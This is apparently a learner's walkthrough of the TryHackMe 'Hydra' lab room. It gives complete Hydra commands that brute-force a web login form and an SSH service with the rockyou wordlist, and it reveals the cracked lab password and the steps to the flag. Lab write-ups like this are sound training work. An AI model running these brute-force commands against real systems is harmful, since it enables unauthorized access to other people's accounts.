# Hydra
+ Description: Learn about and use Hydra, a fast network logon cracker, to bruteforce and obtain a website's credentials. 
+ Link: https://tryhackme.com/room/hydra
+ Type: Walkthrough
+ Completed: 2024-09-08

## Tools
+ Hydra

## External Resources
+ https://infinitelogins.com/2020/02/22/how-to-brute-force-websites-using-hydra/

## Task 1
1. Went to http://<Target IP Address> and looked at the source code. Found it uses the POST method.
2. `hydra -l molly -P /usr/share/wordlists/rockyou.txt <Target IP Address> http-post-form "/login:username=^USER^&password=^PASS^:F=Your username or password is incorrect." -V` to find the web form password.  
   ![](https://github.com/ArcingFirehawk/My-THM-Write-Ups/blob/main/Room03/Screenshots/1.png)
  
3. Logged into the website using the given username and the hydra-ed password to find the flag.
4. `hydra -l molly -P /usr/share/wordlists/rockyou.txt <Target IP Address> -t 4 ssh` to find the SSH password.  
   ![](https://github.com/ArcingFirehawk/My-THM-Write-Ups/blob/main/Room03/Screenshots/2.png)
  
5. `ssh molly@<Target IP Address>` with password butterfly.
   ![](https://github.com/ArcingFirehawk/My-THM-Write-Ups/blob/main/Room03/Screenshots/3.png)
  
6. `ls` and `cat <file name>` to display the flag.

## Learned
+ Generally, don't use `-V` in Hydra, because it makes the output less readable.